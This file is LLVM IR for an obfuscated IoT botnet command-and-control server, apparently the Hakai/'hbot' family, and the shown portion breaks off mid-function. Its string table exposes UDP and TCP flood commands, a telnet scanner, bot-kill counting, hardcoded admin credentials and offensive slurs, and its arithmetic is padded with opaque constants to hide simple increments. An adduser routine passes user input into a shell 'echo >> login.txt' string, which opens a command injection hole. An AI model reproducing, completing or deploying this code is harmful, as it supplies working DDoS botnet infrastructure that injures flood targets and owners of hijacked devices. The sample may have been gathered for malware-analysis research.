; ModuleID = 'host/ir_sub/Hakai.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], [512 x i8], i8 }
%struct.telnetdata_t = type { i32, i32, [20 x i8] }
%struct.name = type { [512 x i8], i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.account = type { [200 x i8], [200 x i8], [200 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"\0D\0A\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"name:\00", align 1
@arra = internal global [40 x %struct.name] zeroinitializer, align 16
@.str.7 = private unnamed_addr constant [9 x i8] c".DSLKFJ\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"LOCKED \00", align 1
@fileFD = internal global %struct._IO_FILE* null, align 8
@.str.10 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"killed pid\00", align 1
@BOATSRAPED = internal global i32 0, align 4
@.str.12 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.14 = private unnamed_addr constant [6 x i8] c"\22%s\22\0A\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.15 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.17 = private unnamed_addr constant [15 x i8] c"[%d.%d.%d.%d]\0A\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@titleWriter.spinbuf = private unnamed_addr constant [4 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0)], align 16
@.str.23 = private unnamed_addr constant [35 x i8] c"%c]0;%d Devices Connected %s  %s%c\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\5C\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"|\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.24 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@.str.25 = private unnamed_addr constant [7 x i8] c"shadoh\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"!HBOT\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.27 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.28 = private unnamed_addr constant [30 x i8] c"\1B[1;31mUsername\1B[1;36m:\1B[37m \00", align 1
@.str.30 = private unnamed_addr constant [15 x i8] c"connection.log\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.32 = private unnamed_addr constant [26 x i8] c"[LOGIN ATTEMPT] USER: %s\0A\00", align 1
@.str.33 = private unnamed_addr constant [30 x i8] c"\1B[1;31mPassword\1B[1;36m:\1B[37m \00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"[FAILED ATTEMPT] USER: %s\0A\00", align 1
@.str.36 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.37 = private unnamed_addr constant [43 x i8] c"\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.29 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.39 = private unnamed_addr constant [6 x i8] c"count\00", align 1
@.str.40 = private unnamed_addr constant [9 x i8] c"botcount\00", align 1
@.str.41 = private unnamed_addr constant [30 x i8] c"\1B[37;1m%s\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [33 x i8] c"\1B[37;1mtotal\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [6 x i8] c"rape?\00", align 1
@.str.44 = private unnamed_addr constant [34 x i8] c"\1B[0mhbot.botkill: \1B[1;31m%d\1B[0m\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.47 = private unnamed_addr constant [28 x i8] c"\1B[0mresolved [%s] to [%s]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.49 = private unnamed_addr constant [37 x i8] c"\1B[0mddoscmds - shows ddos commands\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [36 x i8] c"servercmds - server side commands\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [29 x i8] c"admincmds - admin commands\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"servercmds\00", align 1
@.str.53 = private unnamed_addr constant [29 x i8] c"\1B[0mbots - shows bot count\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [29 x i8] c"exit - disconnect from net\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [28 x i8] c"help - displays help menu\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [10 x i8] c"admincmds\00", align 1
@.str.57 = private unnamed_addr constant [51 x i8] c"\1B[0mbtype - shows architecture of bots connected\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [46 x i8] c"users - displays who's connected to the net\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [66 x i8] c"addusr - add users via server side (IN DEVELOPMENT! VERY BUGGY)\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [32 x i8] c"start - starts telnet scanner\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [39 x i8] c"kickuser - logs user out must be admin\00", align 1
@.str.62 = private unnamed_addr constant [41 x i8] c"You Must Be Admin to Use This Command!\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"ddoscmds\00", align 1
@.str.64 = private unnamed_addr constant [28 x i8] c"\1B[0mUDP ip port time size\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [24 x i8] c"TCP ip port time size\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"\1B[0m\00", align 1
@.str.69 = private unnamed_addr constant [16 x i8] c"Attack Sent! \0D\0A\00", align 1
@.str.70 = private unnamed_addr constant [12 x i8] c"actions.log\00", align 1
@.str.71 = private unnamed_addr constant [31 x i8] c"[hbot] [%s] [Sent an Attack!]\0A\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c". KT\00", align 1
@.str.73 = private unnamed_addr constant [32 x i8] c"[hbot] [%s] [Killed All Pid's]\0A\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"users\00", align 1
@.str.76 = private unnamed_addr constant [39 x i8] c"\1B[31m- \1B[31mOnline Users \1B[31m-\1B[37m\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [37 x i8] c"\1B[37mID(\1B[31m%d\1B[37m) \1B[31m%s\1B[37m\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"kickuser\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"user=\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"USER=\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.82 = private unnamed_addr constant [43 x i8] c"\0A\1B[31mGoodbye, kicked by \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [30 x i8] c"\1B[33mKicked \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"id=\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"ID=\00", align 1
@.str.86 = private unnamed_addr constant [46 x i8] c"\1B[33mKicked user with id of \1B[34m%d\1B[37m...\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [53 x i8] c"You Must Be big daddy shadoh to kick others, queer\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.89 = private unnamed_addr constant [24 x i8] c"echo '\0A%s' >> login.txt\00", align 1
@.str.90 = private unnamed_addr constant [33 x i8] c"[hbot] [%s] [added a user] [%s]\0A\00", align 1
@.str.91 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"chat.log\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.95 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.96 = private unnamed_addr constant [26 x i8] c"[hbot] [Admin Connected] \00", align 1
@.str.97 = private unnamed_addr constant [39 x i8] c"[hbot] [Admin Connected] [%d.%d.%d.%d]\00", align 1
@.str.98 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.99 = private unnamed_addr constant [46 x i8] c"[hbot] Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.101 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.102 = private unnamed_addr constant [11 x i8] c"killer.txt\00", align 1
@kfileFD = internal global %struct._IO_FILE* null, align 8
@.str.103 = private unnamed_addr constant [31 x i8] c"[hbot] Lower Threading Count.\0A\00", align 1
@.str.104 = private unnamed_addr constant [33 x i8] c"[hbot] Socket Opened On Port %d\0A\00", align 1
@.str.105 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"hbot\00", align 1
@.str.109 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.110 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %40

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add i32 %35, -549955997
  %37 = add i32 %36, 1
  %38 = sub i32 %37, -549955997
  %39 = add nsw i32 %35, 1
  store i32 %38, i32* %7, align 4
  br label %9

; <label>:40:                                     ; preds = %25
  %41 = load i32, i32* %8, align 4
  ret i32 %41
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 0, 1
  %9 = add i64 %7, %8
  %10 = sub i64 %7, 1
  %11 = trunc i64 %9 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %34, %1
  %13 = call i16** @__ctype_b_loc() #9
  %14 = load i16*, i16** %13, align 8
  %15 = load i8*, i8** %2, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = sext i8 %19 to i32
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i16, i16* %14, i64 %21
  %23 = load i16, i16* %22, align 2
  %24 = zext i16 %23 to i32
  %25 = xor i32 %24, -1
  %26 = xor i32 8192, -1
  %27 = xor i32 1883627621, -1
  %28 = or i32 %25, %26
  %29 = or i32 1883627621, %27
  %30 = xor i32 %28, -1
  %31 = and i32 %30, %29
  %32 = and i32 %24, 8192
  %33 = icmp ne i32 %31, 0
  br i1 %33, label %34, label %40

; <label>:34:                                     ; preds = %12
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1347393626
  %37 = add i32 %36, 1
  %38 = sub i32 %37, 1347393626
  %39 = add nsw i32 %35, 1
  store i32 %38, i32* %4, align 4
  br label %12

; <label>:40:                                     ; preds = %12
  br label %41

; <label>:41:                                     ; preds = %65, %40
  %42 = load i32, i32* %5, align 4
  %43 = load i32, i32* %4, align 4
  %44 = icmp sge i32 %42, %43
  br i1 %44, label %45, label %63

; <label>:45:                                     ; preds = %41
  %46 = call i16** @__ctype_b_loc() #9
  %47 = load i16*, i16** %46, align 8
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %5, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = sext i8 %52 to i32
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i16, i16* %47, i64 %54
  %56 = load i16, i16* %55, align 2
  %57 = zext i16 %56 to i32
  %58 = xor i32 8192, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 8192
  %62 = icmp ne i32 %60, 0
  br label %63

; <label>:63:                                     ; preds = %45, %41
  %64 = phi i1 [ false, %41 ], [ %62, %45 ]
  br i1 %64, label %65, label %70

; <label>:65:                                     ; preds = %63
  %66 = load i32, i32* %5, align 4
  %67 = sub i32 0, -1
  %68 = sub i32 %66, %67
  %69 = add nsw i32 %66, -1
  store i32 %68, i32* %5, align 4
  br label %41

; <label>:70:                                     ; preds = %63
  %71 = load i32, i32* %4, align 4
  store i32 %71, i32* %3, align 4
  br label %72

; <label>:72:                                     ; preds = %91, %70
  %73 = load i32, i32* %3, align 4
  %74 = load i32, i32* %5, align 4
  %75 = icmp sle i32 %73, %74
  br i1 %75, label %76, label %98

; <label>:76:                                     ; preds = %72
  %77 = load i8*, i8** %2, align 8
  %78 = load i32, i32* %3, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = load i8, i8* %80, align 1
  %82 = load i8*, i8** %2, align 8
  %83 = load i32, i32* %3, align 4
  %84 = load i32, i32* %4, align 4
  %85 = sub i32 %83, -221360419
  %86 = sub i32 %85, %84
  %87 = add i32 %86, -221360419
  %88 = sub nsw i32 %83, %84
  %89 = sext i32 %87 to i64
  %90 = getelementptr inbounds i8, i8* %82, i64 %89
  store i8 %81, i8* %90, align 1
  br label %91

; <label>:91:                                     ; preds = %76
  %92 = load i32, i32* %3, align 4
  %93 = sub i32 0, %92
  %94 = sub i32 0, 1
  %95 = add i32 %93, %94
  %96 = sub i32 0, %95
  %97 = add nsw i32 %92, 1
  store i32 %96, i32* %3, align 4
  br label %72

; <label>:98:                                     ; preds = %72
  %99 = load i8*, i8** %2, align 8
  %100 = load i32, i32* %3, align 4
  %101 = load i32, i32* %4, align 4
  %102 = sub i32 %100, -667011297
  %103 = sub i32 %102, %101
  %104 = add i32 %103, -667011297
  %105 = sub nsw i32 %100, %101
  %106 = sext i32 %104 to i64
  %107 = getelementptr inbounds i8, i8* %99, i64 %106
  store i8 0, i8* %107, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() #3

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca [56 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.tm*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = call i32 @strcmp(i8* %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %16 = icmp eq i32 %15, 0
  br i1 %16, label %17, label %18

; <label>:17:                                     ; preds = %3
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %17, %3
  %19 = load i8*, i8** %4, align 8
  %20 = call i64 @strlen(i8* %19) #8
  %21 = sub i64 0, 10
  %22 = sub i64 %20, %21
  %23 = add i64 %20, 10
  %24 = call noalias i8* @malloc(i64 %22) #7
  store i8* %24, i8** %9, align 8
  %25 = load i8*, i8** %9, align 8
  %26 = load i8*, i8** %4, align 8
  %27 = call i64 @strlen(i8* %26) #8
  %28 = sub i64 0, 10
  %29 = sub i64 %27, %28
  %30 = add i64 %27, 10
  call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 %29, i32 1, i1 false)
  %31 = load i8*, i8** %9, align 8
  %32 = load i8*, i8** %4, align 8
  %33 = call i8* @strcpy(i8* %31, i8* %32) #7
  %34 = load i8*, i8** %9, align 8
  call void @trim(i8* %34)
  %35 = call i64 @time(i64* %10) #7
  %36 = call %struct.tm* @localtime(i64* %10) #7
  store %struct.tm* %36, %struct.tm** %11, align 8
  %37 = load %struct.tm*, %struct.tm** %11, align 8
  %38 = call i8* @asctime(%struct.tm* %37) #7
  store i8* %38, i8** %12, align 8
  %39 = load i8*, i8** %12, align 8
  call void @trim(i8* %39)
  store i32 0, i32* %13, align 4
  br label %40

; <label>:40:                                     ; preds = %117, %18
  %41 = load i32, i32* %13, align 4
  %42 = icmp slt i32 %41, 1000000
  br i1 %42, label %43, label %122

; <label>:43:                                     ; preds = %40
  %44 = load i32, i32* %13, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp eq i32 %44, %45
  br i1 %46, label %64, label %47

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* %13, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %49
  %51 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %50, i32 0, i32 3
  %52 = load i8, i8* %51, align 1
  %53 = icmp ne i8 %52, 0
  br i1 %53, label %65, label %54

; <label>:54:                                     ; preds = %47
  %55 = load i32, i32* %7, align 4
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %64, label %57

; <label>:57:                                     ; preds = %54
  %58 = load i32, i32* %13, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %59
  %61 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %60, i32 0, i32 1
  %62 = load i32, i32* %61, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %65, label %64

; <label>:64:                                     ; preds = %57, %54, %43
  br label %117

; <label>:65:                                     ; preds = %57, %47
  %66 = load i32, i32* %7, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %68, label %85

; <label>:68:                                     ; preds = %65
  %69 = load i32, i32* %13, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %70
  %72 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %71, i32 0, i32 1
  %73 = load i32, i32* %72, align 4
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %75, label %85

; <label>:75:                                     ; preds = %68
  %76 = load i32, i32* %13, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i64 7, i32 16384)
  %78 = load i32, i32* %13, align 4
  %79 = load i8*, i8** %6, align 8
  %80 = load i8*, i8** %6, align 8
  %81 = call i64 @strlen(i8* %80) #8
  %82 = call i64 @send(i32 %78, i8* %79, i64 %81, i32 16384)
  %83 = load i32, i32* %13, align 4
  %84 = call i64 @send(i32 %83, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  br label %85

; <label>:85:                                     ; preds = %75, %68, %65
  %86 = load i32, i32* %13, align 4
  %87 = load i8*, i8** %4, align 8
  %88 = load i8*, i8** %4, align 8
  %89 = call i64 @strlen(i8* %88) #8
  %90 = call i64 @send(i32 %86, i8* %87, i64 %89, i32 16384)
  %91 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i32 0, i32 0
  %92 = load i32, i32* %13, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %93
  %95 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %94, i32 0, i32 2
  %96 = getelementptr inbounds [20 x i8], [20 x i8]* %95, i32 0, i32 0
  %97 = call i32 (i8*, i8*, ...) @sprintf(i8* %91, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i32 0, i32 0), i8* %96) #7
  %98 = load i32, i32* %7, align 4
  %99 = icmp ne i32 %98, 0
  br i1 %99, label %100, label %113

; <label>:100:                                    ; preds = %85
  %101 = load i32, i32* %13, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %102
  %104 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %103, i32 0, i32 1
  %105 = load i32, i32* %104, align 4
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %107, label %113

; <label>:107:                                    ; preds = %100
  %108 = load i32, i32* %13, align 4
  %109 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i32 0, i32 0
  %110 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i32 0, i32 0
  %111 = call i64 @strlen(i8* %110) #8
  %112 = call i64 @send(i32 %108, i8* %109, i64 %111, i32 16384)
  br label %116

; <label>:113:                                    ; preds = %100, %85
  %114 = load i32, i32* %13, align 4
  %115 = call i64 @send(i32 %114, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i64 1, i32 16384)
  br label %116

; <label>:116:                                    ; preds = %113, %107
  br label %117

; <label>:117:                                    ; preds = %116, %64
  %118 = load i32, i32* %13, align 4
  %119 = sub i32 0, 1
  %120 = sub i32 %118, %119
  %121 = add nsw i32 %118, 1
  store i32 %120, i32* %13, align 4
  br label %40

; <label>:122:                                    ; preds = %40
  %123 = load i8*, i8** %9, align 8
  call void @free(i8* %123) #7
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #4

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #4

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @removestr(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %5 = load i8*, i8** %3, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i8* @strstr(i8* %5, i8* %6) #8
  store i8* %7, i8** %3, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %3, align 8
  %10 = load i8*, i8** %4, align 8
  %11 = call i64 @strlen(i8* %10) #8
  %12 = getelementptr inbounds i8, i8* %9, i64 %11
  %13 = load i8*, i8** %3, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #8
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = call i64 @strlen(i8* %16) #8
  %18 = sub i64 0, 1
  %19 = sub i64 0, %17
  %20 = add i64 %18, %19
  %21 = sub i64 0, %20
  %22 = add i64 1, %17
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %8, i8* %12, i64 %21, i32 1, i1 false)
  ret void
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i8* @epollEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [200 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.clientdata_t*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i64, align 8
  %20 = alloca [2048 x i8], align 16
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %23 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %24 = bitcast i8* %23 to %struct.epoll_event*
  store %struct.epoll_event* %24, %struct.epoll_event** %5, align 8
  br label %25

; <label>:25:                                     ; preds = %373, %1
  %26 = load volatile i32, i32* @epollFD, align 4
  %27 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %28 = call i32 @epoll_wait(i32 %26, %struct.epoll_event* %27, i32 1000000, i32 -1)
  store i32 %28, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %29

; <label>:29:                                     ; preds = %367, %25
  %30 = load i32, i32* %8, align 4
  %31 = load i32, i32* %7, align 4
